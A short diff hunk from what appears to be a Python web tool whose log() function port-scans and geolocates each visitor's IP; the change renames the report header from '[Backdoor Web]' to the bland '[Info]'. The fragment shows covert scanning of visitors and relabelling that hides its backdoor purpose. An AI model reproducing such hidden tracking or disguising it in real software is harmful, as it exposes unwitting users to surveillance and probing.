@@ -108,7 +108,7 @@ def log():
     ports = scan_ports(ip)
 
     details = (
-        f"[Backdoor Web]\n"
+        f"[Info]\n"
         f"IP : {ip}\n"
         f"Localisation : {location}\n"
         f"Ports : {ports if ports else 'Aucun'}\n"
